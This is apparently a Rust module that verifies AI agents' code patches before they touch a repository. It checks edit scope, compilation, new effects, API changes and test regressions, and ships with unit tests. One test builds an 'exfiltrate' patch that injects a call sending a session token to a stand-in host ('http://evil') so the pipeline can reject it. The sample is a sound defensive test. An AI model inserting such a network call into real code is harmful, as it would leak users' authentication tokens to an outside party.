//! Typed patches and the verification pipeline.
//!
//! An agent never edits files directly. It submits a `Patch` — a scoped, typed
//! intent — and the pipeline decides whether it may touch the repo. A patch is
//! rejected *before* it mutates anything if it reaches outside its declared
//! scope, fails to compile, introduces a new effect, or regresses a test. This
//! is the difference between an agent that sprays diffs and one whose every
//! change is proven safe.

use crate::check::{self, check_program};
use crate::diagnostics::Diagnostic;
use crate::program::Program;
use crate::runner::{run_tests_named, TestReport};
use crate::source::SourceFile;
use crate::span::Span;
use serde::{Deserialize, Serialize};
use std::collections::{BTreeMap, BTreeSet};

/// An in-memory snapshot of every source file in a project. All patch work
/// happens against a `Workspace`; nothing touches disk until the caller decides
/// to commit a verified result.
#[derive(Clone, Debug, Default)]
pub struct Workspace {
    pub files: BTreeMap<String, String>,
}

impl Workspace {
    pub fn new() -> Self {
        Workspace::default()
    }

    pub fn insert(&mut self, path: impl Into<String>, text: impl Into<String>) {
        self.files.insert(path.into(), text.into());
    }

    /// Parse the whole workspace into a `Program`.
    pub fn program(&self) -> (Program, Vec<Diagnostic>) {
        let sources: Vec<SourceFile> = self
            .files
            .iter()
            .map(|(p, t)| SourceFile::new(p.clone(), t.clone()))
            .collect();
        Program::parse_sources(sources)
    }

    /// The source slice covered by a span in `file`.
    pub fn slice(&self, file: &str, span: Span) -> String {
        match self.files.get(file) {
            Some(text) => {
                let end = span.end.min(text.len());
                let start = span.start.min(end);
                text[start..end].to_string()
            }
            None => String::new(),
        }
    }

    /// Apply a set of edits, returning a new workspace. Edits to the same file
    /// are applied in descending offset order so earlier edits never invalidate
    /// the offsets of later ones.
    pub fn apply_edits(&self, edits: &[Edit]) -> Result<Workspace, String> {
        let mut out = self.clone();
        let mut by_file: BTreeMap<String, Vec<&Edit>> = BTreeMap::new();
        for e in edits {
            by_file.entry(e.file.clone()).or_default().push(e);
        }
        for (file, mut file_edits) in by_file {
            let text = out
                .files
                .get(&file)
                .ok_or_else(|| format!("edit targets unknown file `{}`", file))?
                .clone();
            file_edits.sort_by(|a, b| b.span.start.cmp(&a.span.start));
            let mut buf = text;
            for e in file_edits {
                let start = e.span.start;
                let end = e.span.end;
                if start > buf.len() || end > buf.len() || start > end {
                    return Err(format!(
                        "edit span {}..{} out of bounds for `{}`",
                        start, end, file
                    ));
                }
                buf.replace_range(start..end, &e.replacement);
            }
            out.files.insert(file, buf);
        }
        Ok(out)
    }
}

/// A single span-replacement edit.
#[derive(Clone, Debug, Serialize, Deserialize)]
pub struct Edit {
    pub file: String,
    pub span: Span,
    pub replacement: String,
}

/// A typed patch: a scoped, named, justified bundle of edits with proof
/// obligations the pipeline will discharge before allowing it through.
#[derive(Clone, Debug, Serialize, Deserialize)]
pub struct Patch {
    pub name: String,
    pub reason: String,
    /// Glob patterns the patch is permitted to touch.
    pub touches: Vec<String>,
    pub edits: Vec<Edit>,
    /// Human-facing proof obligations (e.g. `tach check`, `tach test`).
    pub prove: Vec<String>,
}

/// Knobs controlling which obligations are blocking for a given verification.
pub struct VerifyOpts {
    /// Reject patches that make the program perform an effect it never did before.
    pub allow_new_effects: bool,
    /// Reject patches that change any public function signature.
    pub forbid_api_break: bool,
}

impl Default for VerifyOpts {
    fn default() -> Self {
        VerifyOpts {
            allow_new_effects: false,
            forbid_api_break: false,
        }
    }
}

/// The pipeline's verdict on a patch.
#[derive(Clone, Debug)]
pub struct PatchVerdict {
    pub accepted: bool,
    pub rejections: Vec<String>,
    pub errors_after: usize,
    pub new_effects: Vec<String>,
    pub api_changes: Vec<String>,
    pub impacted_tests: Vec<String>,
    pub tests: TestReport,
    /// The post-patch workspace (valid for inspection even when rejected).
    pub workspace: Workspace,
}

impl PatchVerdict {
    pub fn tests_run(&self) -> usize {
        self.tests.total()
    }
}

/// Verify a patch against a base workspace without committing it.
pub fn verify_patch(base: &Workspace, patch: &Patch, opts: &VerifyOpts) -> PatchVerdict {
    let mut rejections = Vec::new();

    // 1) Scope: every edit must fall inside the declared `touches` globs.
    for e in &patch.edits {
        if !patch.touches.iter().any(|g| glob_match(g, &e.file)) {
            rejections.push(format!("touched file outside allowed scope: {}", e.file));
        }
    }

    // 2) Apply (against a clone). A failure here is itself a rejection.
    let after = match base.apply_edits(&patch.edits) {
        Ok(w) => w,
        Err(msg) => {
            rejections.push(format!("could not apply patch: {}", msg));
            base.clone()
        }
    };

    let (base_prog, _) = base.program();
    let (after_prog, after_pdiags) = after.program();

    // 3) Must still compile.
    let parse_errors = after_pdiags.iter().filter(|d| d.is_error()).count();
    let sem = check_program(&after_prog);
    let errors_after = parse_errors + sem.iter().filter(|d| d.is_error()).count();
    if parse_errors > 0 {
        rejections.push(format!("patch introduced {} syntax error(s)", parse_errors));
    }

    // 4) Effect delta: did the patch make the program *do* something new?
    let before_eff = check::used_effects(&base_prog);
    let after_eff = check::used_effects(&after_prog);
    let new_effects: Vec<String> = after_eff.difference(&before_eff).cloned().collect();
    if !opts.allow_new_effects {
        for e in &new_effects {
            rejections.push(format!("introduced new effect: {}", e));
        }
    }

    // 5) Public API changes.
    let api_changes = changed_signatures(&base_prog, &after_prog);
    if opts.forbid_api_break {
        for c in &api_changes {
            rejections.push(format!("changed public API: {}", c));
        }
    }

    // 6) Impacted tests + regression guard. Only the tests that can actually be
    // affected by the touched functions are run.
    let changed_files: BTreeSet<String> = patch.edits.iter().map(|e| e.file.clone()).collect();
    let changed_fns = fns_defined_in_files(&after_prog, &changed_files);
    let impacted = impacted_tests(&after_prog, &changed_fns);
    let before_report = run_tests_named(&base_prog, &impacted);
    let after_report = run_tests_named(&after_prog, &impacted);
    for t in &impacted {
        let was = test_passed(&before_report, t);
        let now = test_passed(&after_report, t);
        if was && !now {
            rejections.push(format!("regressed test: {}", t));
        }
    }

    PatchVerdict {
        accepted: rejections.is_empty(),
        rejections,
        errors_after,
        new_effects,
        api_changes,
        impacted_tests: impacted.iter().cloned().collect(),
        tests: after_report,
        workspace: after,
    }
}

fn test_passed(report: &TestReport, name: &str) -> bool {
    report.outcomes.iter().any(|o| o.name == name && o.passed)
}

/// Functions whose signature was added, removed, or changed between two programs.
fn changed_signatures(before: &Program, after: &Program) -> Vec<String> {
    let bsig = signatures(before);
    let asig = signatures(after);
    let mut changes = Vec::new();
    for (name, sig) in &asig {
        match bsig.get(name) {
            Some(old) if old != sig => changes.push(format!("{} {} -> {}", name, old, sig)),
            None => changes.push(format!("added {}{}", name, sig)),
            _ => {}
        }
    }
    for name in bsig.keys() {
        if !asig.contains_key(name) {
            changes.push(format!("removed {}", name));
        }
    }
    changes.sort();
    changes
}

fn signatures(program: &Program) -> BTreeMap<String, String> {
    let mut m = BTreeMap::new();
    for u in &program.units {
        for it in &u.module.items {
            if let crate::ast::Item::Fn(f) = it {
                m.insert(f.name.clone(), check::signature_string(f));
            }
        }
    }
    m
}

fn fns_defined_in_files(program: &Program, files: &BTreeSet<String>) -> BTreeSet<String> {
    let mut s = BTreeSet::new();
    for u in &program.units {
        if files.contains(&u.source.path) {
            for it in &u.module.items {
                if let crate::ast::Item::Fn(f) = it {
                    s.insert(f.name.clone());
                }
            }
        }
    }
    s
}

/// Call graph over user functions: name -> set of user functions it calls.
fn call_graph(program: &Program) -> BTreeMap<String, BTreeSet<String>> {
    let defined: BTreeSet<String> = program.functions().keys().cloned().collect();
    let mut g = BTreeMap::new();
    for u in &program.units {
        for it in &u.module.items {
            if let crate::ast::Item::Fn(f) = it {
                let calls: BTreeSet<String> = check::called_names_in_block(&f.body)
                    .into_iter()
                    .filter(|n| defined.contains(n))
                    .collect();
                g.insert(f.name.clone(), calls);
            }
        }
    }
    g
}

/// The tests whose execution can reach any of the `changed` functions.
pub fn impacted_tests(program: &Program, changed: &BTreeSet<String>) -> BTreeSet<String> {
    let g = call_graph(program);
    let defined: BTreeSet<String> = program.functions().keys().cloned().collect();
    let mut impacted = BTreeSet::new();
    for t in program.tests() {
        let seeds: BTreeSet<String> = check::called_names_in_block(&t.body)
            .into_iter()
            .filter(|n| defined.contains(n))
            .collect();
        let reach = reachable(&g, seeds);
        if !reach.is_disjoint(changed) {
            impacted.insert(t.name.clone());
        }
    }
    impacted
}

fn reachable(g: &BTreeMap<String, BTreeSet<String>>, seeds: BTreeSet<String>) -> BTreeSet<String> {
    let mut seen = BTreeSet::new();
    let mut stack: Vec<String> = seeds.into_iter().collect();
    while let Some(n) = stack.pop() {
        if seen.insert(n.clone()) {
            if let Some(callees) = g.get(&n) {
                for c in callees {
                    if !seen.contains(c) {
                        stack.push(c.clone());
                    }
                }
            }
        }
    }
    seen
}

/// Minimal glob matcher: `**` matches any run (including `/`); `*` matches any
/// run except `/`; everything else is literal.
pub fn glob_match(pattern: &str, path: &str) -> bool {
    fn m(p: &[char], t: &[char]) -> bool {
        if p.is_empty() {
            return t.is_empty();
        }
        if p[0] == '*' {
            if p.len() >= 2 && p[1] == '*' {
                let rest = &p[2..];
                for i in 0..=t.len() {
                    if m(rest, &t[i..]) {
                        return true;
                    }
                }
                false
            } else {
                let rest = &p[1..];
                let mut i = 0;
                loop {
                    if m(rest, &t[i..]) {
                        return true;
                    }
                    if i < t.len() && t[i] != '/' {
                        i += 1;
                    } else {
                        return false;
                    }
                }
            }
        } else if !t.is_empty() && p[0] == t[0] {
            m(&p[1..], &t[1..])
        } else {
            false
        }
    }
    let pc: Vec<char> = pattern.chars().collect();
    let tc: Vec<char> = path.chars().collect();
    m(&pc, &tc)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn ws_with(code: &str, tests: &str) -> Workspace {
        let mut w = Workspace::new();
        w.insert("src/auth.tach", code);
        w.insert("tests/auth_test.tach", tests);
        w
    }

    const CODE: &str = r#"
import db
import time

type Session = { token: String, expires_at: Int }

fn load_session(token: String) -> Result<Session, AuthError> effects [db.read, time.read] {
  let row = db.query("q", token)?
  ensure row.expires_at > time.now()
  return Ok(Session { token: row.token, expires_at: row.expires_at })
}
"#;

    const TESTS: &str = r#"
import db
test "valid loads" {
  db.seed("abc", { token: "abc", expires_at: 9999 })
  ensure load_session("abc").is_ok()
}
"#;

    #[test]
    fn glob_matches() {
        assert!(glob_match("src/**", "src/auth.tach"));
        assert!(glob_match("src/auth.tach", "src/auth.tach"));
        assert!(glob_match("*", "auth.tach"));
        assert!(!glob_match("src/*.tach", "src/sub/auth.tach"));
        assert!(!glob_match("src/auth.tach", "src/billing.tach"));
    }

    #[test]
    fn rejects_out_of_scope_edit() {
        let ws = ws_with(CODE, TESTS);
        let patch = Patch {
            name: "sneaky".into(),
            reason: "touch a file it shouldn't".into(),
            touches: vec!["src/auth.tach".into()],
            edits: vec![Edit {
                file: "tests/auth_test.tach".into(),
                span: Span::at(0),
                replacement: "// hi\n".into(),
            }],
            prove: vec![],
        };
        let v = verify_patch(&ws, &patch, &VerifyOpts::default());
        assert!(!v.accepted);
        assert!(v
            .rejections
            .iter()
            .any(|r| r.contains("outside allowed scope")));
    }

    #[test]
    fn rejects_new_effect() {
        let ws = ws_with(CODE, TESTS);
        // Inject a net.post call into load_session's body — introduces net.write.
        let needle = "let row = db.query(\"q\", token)?";
        let start = CODE.find(needle).unwrap();
        let inject_at = start; // insert before the let
        let patch = Patch {
            name: "add-network".into(),
            reason: "exfiltrate".into(),
            touches: vec!["src/**".into()],
            edits: vec![Edit {
                file: "src/auth.tach".into(),
                span: Span::at(inject_at),
                replacement: "net.post(\"http://evil\", token)\n  ".into(),
            }],
            prove: vec![],
        };
        let v = verify_patch(&ws, &patch, &VerifyOpts::default());
        assert!(!v.accepted, "should reject new effect");
        assert!(v
            .rejections
            .iter()
            .any(|r| r.contains("new effect: net.write")));
    }

    #[test]
    fn impacted_tests_are_scoped() {
        let ws = ws_with(CODE, TESTS);
        let (prog, _) = ws.program();
        let mut changed = BTreeSet::new();
        changed.insert("load_session".to_string());
        let impacted = impacted_tests(&prog, &changed);
        assert!(impacted.contains("valid loads"));
    }
}
